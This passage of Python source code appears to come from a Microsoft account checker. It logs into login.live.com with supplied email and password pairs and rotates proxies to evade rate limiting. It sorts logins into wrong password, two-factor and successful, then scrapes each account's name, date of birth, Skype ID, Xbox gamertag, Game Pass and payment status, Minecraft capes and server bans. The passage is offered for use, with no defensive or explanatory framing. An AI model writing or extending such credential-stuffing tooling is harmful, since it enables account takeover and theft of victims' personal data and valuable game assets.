            print(f"🔄 Retry #{attempt} after cooldown ({left:.0f}s) with proxy...")
            try:
                ratelimit.wait_turn(f"retry-{attempt}")
            except Exception:
                time.sleep(8)
        driver = create_driver(headless=False, use_proxy=use_proxy, force_rotate=force_rotate)
        wait = WebDriverWait(driver, 12)
        try:
            result = _scrape_account_info_inner(driver, wait, email, password)
            err = (result or {}).get("error") or ""
            if "Too Many Requests" in err or "Rate limited" in err:
                mark_driver_fail(driver)
                last_error = result
                driver.quit()
                continue
            if _is_rate_limited(driver):
                try:
                    ratelimit.trip()
                except Exception:
                    pass
                mark_driver_fail(driver)
                last_error = {"email": email, "error": "Rate limited by Microsoft"}
                driver.quit()
                continue
            mark_driver_success(driver)
            driver.quit()
            return result
        except Exception as e:
            print(f"❌ Attempt {attempt + 1} failed: {e}")
            mark_driver_fail(driver)
            last_error = {"email": email, "error": str(e)}
            try:
                driver.quit()
            except Exception:
                pass
            msg = str(e).lower()
            if "stale" in msg or "index" in msg or "password" in msg:
                return last_error
            continue
    return last_error or {"email": email, "error": "All proxy attempts exhausted"}


def _scrape_account_info_inner(driver, wait, email: str, password: str) -> dict:
    driver.get("https://login.live.com")
    _submit_email(driver, wait, email)

    password_input = _reach_password(driver, timeout=18)
    if password_input == "NO_PASSWORD_OPTIONS":
        return {"email": email, "error": "no password options"}
    if password_input is None:
        print("❌ Failed to reach password input.")
        return {"email": email, "error": "Could not reach password input"}

    _submit_password(driver, password_input, password)

    t_end = time.time() + 1.8
    while time.time() < t_end:
        src = ""
        try:
            src = (driver.page_source or "").lower()
        except Exception:
            pass
        if any(x in src for x in [
            "password is incorrect",
            "account or password is incorrect",
            "that password is incorrect",
        ]):
            print("❌ Incorrect password.")
            return {"email": email, "error": "Incorrect password"}
        time.sleep(0.1)

    post = _handle_after_password(driver, max_s=24.0)
    if post == "2FA":
        return {"email": email, "error": "2FA after password"}

    if _is_rate_limited(driver) or "Too Many Requests" in (driver.page_source or ""):
        try:
            ratelimit.trip()
        except Exception:
            pass
        return {"email": email, "error": "Too Many Requests even after retry"}

    profile = _extract_profile(driver)
    name = profile.get("name") or "Name not found"
    dob = profile.get("dob") or "DOB not found"
    region = profile.get("region") or "Region not found"
    first_name = profile.get("first_name") or ""
    last_name = profile.get("last_name") or ""

    driver.get("https://secure.skype.com/portal/profile")
    time.sleep(1.0)
    try:
        skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
    except Exception:
        skype_id = "live:"
    try:
        skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
    except Exception:
        skype_email = email

    driver.get("https://www.xbox.com/en-IN/play/user")
    time.sleep(1.5)
    gamertag = "Not found"
    try:
        try:
            driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]').click()
            time.sleep(2)
        except Exception:
            pass
        try:
            WebDriverWait(driver, 4).until(
                EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
            ).click()
            WebDriverWait(driver, 8).until(EC.url_contains("/play/user/"))
        except Exception:
            pass
        url = driver.current_url
        if "/play/user/" in url:
            gamertag = url.split("/play/user/")[-1].replace("%20", " ").replace("%25", "%")
    except Exception:
        gamertag = "Error"

    print("🔍 Running account checks...")
    try:
        checks = run_all_checks(driver)
    except Exception as e:
        print(f"⚠️ Checks failed: {e}")
        checks = {}

    return {
        "email": email, "password": password, "name": name, "dob": dob, "region": region,
        "first_name": first_name, "last_name": last_name,
        "skype_id": skype_id, "skype_email": skype_email, "gamertag": gamertag,
        "mc_java": checks.get("mc_java", "⚠️ Skipped"),
        "mc_bedrock": checks.get("mc_bedrock", "⚠️ Skipped"),
        "mc_username": checks.get("mc_username", "—"),
        "mc_uuid": checks.get("mc_uuid", "—"),
        "mc_capes": checks.get("mc_capes", "None"),
        "mc_cape_migrator": checks.get("mc_cape_migrator", "—"),
        "mc_cape_minecon": checks.get("mc_cape_minecon", "—"),
        "mc_cape_personal": checks.get("mc_cape_personal", "—"),
        "mc_cape_extra": checks.get("mc_cape_extra", "—"),
        "mc_cape_optifine": checks.get("mc_cape_optifine", "—"),
        "mc_cape_render": checks.get("mc_cape_render", "—"),
        "mc_body_render": checks.get("mc_body_render", "—"),
        "name_change_allowed": checks.get("name_change_allowed", "—"),
        "name_changed_at": checks.get("name_changed_at", "—"),
        "name_created_at": checks.get("name_created_at", "—"),
        "name_history": checks.get("name_history", "—"),
        "xbox_gp": checks.get("xbox_gp", "⚠️ Skipped"),
        "xbox_gpu": checks.get("xbox_gpu", "⚠️ Skipped"),
        "xbox_pc_gp": checks.get("xbox_pc_gp", "⚠️ Skipped"),
        "xbox_gold": checks.get("xbox_gold", "⚠️ Skipped"),
        "xbox_gp_core": checks.get("xbox_gp_core", "⚠️ Skipped"),
        "xbox_gpu_days": checks.get("xbox_gpu_days", "—"),
        "xbox_pc_days": checks.get("xbox_pc_days", "—"),
        "xbox_payment": checks.get("xbox_payment", "—"),
        "ms_rewards": checks.get("ms_rewards", "—"),
        "hypixel_ban": checks.get("hypixel_ban", "⚠️ Skipped"),
        "donut_ban": checks.get("donut_ban", "⚠️ Skipped"),
    }